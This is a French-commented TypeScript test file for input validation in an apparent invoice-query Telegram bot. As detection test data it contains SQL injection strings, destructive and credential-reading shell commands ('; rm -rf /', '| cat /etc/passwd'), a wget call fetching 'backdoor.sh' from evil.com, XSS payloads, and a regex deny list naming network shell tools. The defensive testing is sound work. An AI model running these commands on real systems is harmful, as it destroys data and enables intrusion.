/**
 * Tests de validation des entrées et sécurité
 * Couvre: validateUserInput, containsSuspiciousContent, sanitizeError
 * et la validation de la transcription vocale
 */

import { describe, it, expect } from 'vitest';

// ──────────────────────────────────────────────────────
// Reproduire les fonctions de validation et sécurité
// pour tester sans dépendre des imports réels (config, etc.)
// ──────────────────────────────────────────────────────

function containsSuspiciousContent(text: string): boolean {
  const sqlPatterns = [
    /(\bDROP\b|\bDELETE\b|\bINSERT\b|\bUPDATE\b).*\b(TABLE|DATABASE|FROM|INTO)\b/i,
    /union.*select/i,
    /;\s*drop/i,
  ];
  const commandPatterns = [
    /[;&|`$]\s*(rm|cat|ls|wget|curl|bash|sh|nc|netcat)/i,
    /\$\(.*\)/,
    /`.*`/,
  ];
  const xssPatterns = [
    /<script/i,
    /javascript:/i,
    /onerror\s*=/i,
  ];
  const allPatterns = [...sqlPatterns, ...commandPatterns, ...xssPatterns];
  return allPatterns.some(pattern => pattern.test(text));
}

interface ValidationResult {
  valid: boolean;
  error?: string;
  sanitized?: string;
}

function validateUserInput(
  input: string,
  options?: { maxLength?: number; allowEmpty?: boolean; fieldName?: string }
): ValidationResult {
  const maxLength = options?.maxLength || 500;
  const allowEmpty = options?.allowEmpty ?? false;
  const fieldName = options?.fieldName || 'Input';

  if (!input || input.trim().length === 0) {
    if (!allowEmpty) {
      return { valid: false, error: `${fieldName} ne peut pas être vide` };
    }
    return { valid: true, sanitized: '' };
  }

  if (input.length > maxLength) {
    return { valid: false, error: `${fieldName} est trop long (maximum ${maxLength} caractères)` };
  }

  if (containsSuspiciousContent(input)) {
    return { valid: false, error: `${fieldName} contient des caractères non autorisés` };
  }

  const sanitized = input.trim().replace(/\0/g, '');
  return { valid: true, sanitized };
}

// ──────────────────────────────────────────────────────
// TESTS - containsSuspiciousContent
// ──────────────────────────────────────────────────────

describe('containsSuspiciousContent()', () => {
  describe('SQL Injection', () => {
    it('détecte DROP TABLE', () => {
      expect(containsSuspiciousContent('DROP TABLE users')).toBe(true);
    });

    it('détecte DELETE FROM', () => {
      expect(containsSuspiciousContent('DELETE FROM authorized_users')).toBe(true);
    });

    it('détecte INSERT INTO', () => {
      expect(containsSuspiciousContent("INSERT INTO users VALUES('hack')")).toBe(true);
    });

    it('détecte UPDATE ... FROM', () => {
      expect(containsSuspiciousContent('UPDATE users SET role FROM admin')).toBe(true);
    });

    it('détecte UNION SELECT', () => {
      expect(containsSuspiciousContent("1 UNION SELECT * FROM users")).toBe(true);
    });

    it('détecte ; drop', () => {
      expect(containsSuspiciousContent("; drop table users")).toBe(true);
    });

    it('ne bloque PAS les mots SQL isolés dans du texte normal', () => {
      expect(containsSuspiciousContent('factures impayées')).toBe(false);
      expect(containsSuspiciousContent('dernière facture de Foster')).toBe(false);
      expect(containsSuspiciousContent('table des matières')).toBe(false);
    });
  });

  describe('Command Injection', () => {
    it('détecte ; rm -rf', () => {
      expect(containsSuspiciousContent('; rm -rf /')).toBe(true);
    });

    it('détecte | cat /etc/passwd', () => {
      expect(containsSuspiciousContent('| cat /etc/passwd')).toBe(true);
    });

    it('détecte $(command)', () => {
      expect(containsSuspiciousContent('$(whoami)')).toBe(true);
    });

    it('détecte backticks', () => {
      expect(containsSuspiciousContent('`id`')).toBe(true);
    });

    it('détecte & wget', () => {
      expect(containsSuspiciousContent('& wget http://evil.com/backdoor.sh')).toBe(true);
    });
  });

  describe('XSS', () => {
    it('détecte <script>', () => {
      expect(containsSuspiciousContent('<script>alert(1)</script>')).toBe(true);
    });

    it('détecte javascript:', () => {
      expect(containsSuspiciousContent('javascript:alert(1)')).toBe(true);
    });

    it('détecte onerror=', () => {
      expect(containsSuspiciousContent('onerror=alert(1)')).toBe(true);
    });
  });

  describe('Messages légitimes', () => {
    it('accepte les questions normales', () => {
      expect(containsSuspiciousContent('Combien de factures impayées ?')).toBe(false);
    });

    it('accepte les noms de fournisseurs', () => {
      expect(containsSuspiciousContent('Factures de Colruyt')).toBe(false);
    });

    it('accepte les montants', () => {
      expect(containsSuspiciousContent('Dépenses supérieures à 1000€')).toBe(false);
    });

    it('accepte les dates', () => {
      expect(containsSuspiciousContent('Transactions entre 2025-01-01 et 2025-12-31')).toBe(false);
    });

    it('accepte les emojis', () => {
      expect(containsSuspiciousContent('Merci beaucoup ! 👍')).toBe(false);
    });

    it('accepte les caractères accentués', () => {
      expect(containsSuspiciousContent('Récapitulatif des dépenses de février')).toBe(false);
    });
  });
});

// ──────────────────────────────────────────────────────
// TESTS - validateUserInput
// ──────────────────────────────────────────────────────

describe('validateUserInput()', () => {
  describe('Validation de base', () => {
    it('accepte un message normal', () => {
      const result = validateUserInput('Bonjour');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('Bonjour');
    });

    it('rejette un message vide', () => {
      const result = validateUserInput('');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('vide');
    });

    it('rejette un message de whitespace uniquement', () => {
      const result = validateUserInput('   ');
      expect(result.valid).toBe(false);
    });

    it('accepte un message vide si allowEmpty=true', () => {
      const result = validateUserInput('', { allowEmpty: true });
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('');
    });
  });

  describe('Longueur maximale', () => {
    it('rejette un message trop long', () => {
      const longMessage = 'a'.repeat(501);
      const result = validateUserInput(longMessage);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('trop long');
    });

    it('accepte un message exactement à la limite', () => {
      const exactMessage = 'a'.repeat(500);
      const result = validateUserInput(exactMessage);
      expect(result.valid).toBe(true);
    });

    it('respecte une limite personnalisée', () => {
      const result = validateUserInput('abcdef', { maxLength: 5 });
      expect(result.valid).toBe(false);
    });
  });

  describe('Contenu suspect', () => {
    it('rejette les tentatives SQL injection', () => {
      const result = validateUserInput('DROP TABLE users');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('non autorisés');
    });

    it('rejette les tentatives de commande', () => {
      const result = validateUserInput('; rm -rf /');
      expect(result.valid).toBe(false);
    });

    it('rejette les tentatives XSS', () => {
      const result = validateUserInput('<script>alert(1)</script>');
      expect(result.valid).toBe(false);
    });
  });

  describe('Sanitisation', () => {
    it('trim les espaces', () => {
      const result = validateUserInput('  Bonjour  ');
      expect(result.sanitized).toBe('Bonjour');
    });

    it('supprime les null bytes', () => {
      const result = validateUserInput('Bonjour\0monde');
      expect(result.sanitized).toBe('Bonjourmonde');
    });
  });

  describe('Nom de champ personnalisé', () => {
    it('utilise le nom de champ dans le message d erreur', () => {
      const result = validateUserInput('', { fieldName: 'Transcription vocale' });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Transcription vocale');
    });
  });
});

// ──────────────────────────────────────────────────────
// TESTS - Simulation validation vocale
// ──────────────────────────────────────────────────────

describe('Validation transcription vocale (simulation)', () => {
  /**
   * Simule le flow de handleVoiceMessage dans telegram-bot.ts:
   * La transcription est maintenant validée avant d'être traitée.
   */
  function simulateVoiceFlow(transcription: string): { processed: boolean; error?: string; sanitized?: string } {
    const validation = validateUserInput(transcription, {
      maxLength: 500,
      allowEmpty: false,
      fieldName: 'Transcription vocale',
    });

    if (!validation.valid) {
      return { processed: false, error: validation.error };
    }

    return { processed: true, sanitized: validation.sanitized };
  }

  it('accepte une question vocale normale', () => {
    const result = simulateVoiceFlow('Combien de factures impayées ?');
    expect(result.processed).toBe(true);
    expect(result.sanitized).toBe('Combien de factures impayées ?');
  });

  it('accepte une commande vocale avec fournisseur', () => {
    const result = simulateVoiceFlow('Dernière facture de Foster');
    expect(result.processed).toBe(true);
  });

  it('rejette une transcription vide', () => {
    const result = simulateVoiceFlow('');
    expect(result.processed).toBe(false);
    expect(result.error).toContain('Transcription vocale');
  });

  it('rejette une injection SQL par voix', () => {
    const result = simulateVoiceFlow('DROP TABLE authorized_users');
    expect(result.processed).toBe(false);
    expect(result.error).toContain('non autorisés');
  });

  it('rejette une injection de commande par voix', () => {
    const result = simulateVoiceFlow('; rm -rf /home');
    expect(result.processed).toBe(false);
  });

  it('rejette une transcription trop longue', () => {
    const longText = 'mot '.repeat(200); // 800 chars
    const result = simulateVoiceFlow(longText);
    expect(result.processed).toBe(false);
    expect(result.error).toContain('trop long');
  });

  it('accepte une transcription avec accents français', () => {
    const result = simulateVoiceFlow('Récapitulatif des dépenses de février à décembre');
    expect(result.processed).toBe(true);
  });

  it('nettoie les espaces en début et fin', () => {
    const result = simulateVoiceFlow('  factures impayées  ');
    expect(result.processed).toBe(true);
    expect(result.sanitized).toBe('factures impayées');
  });
});
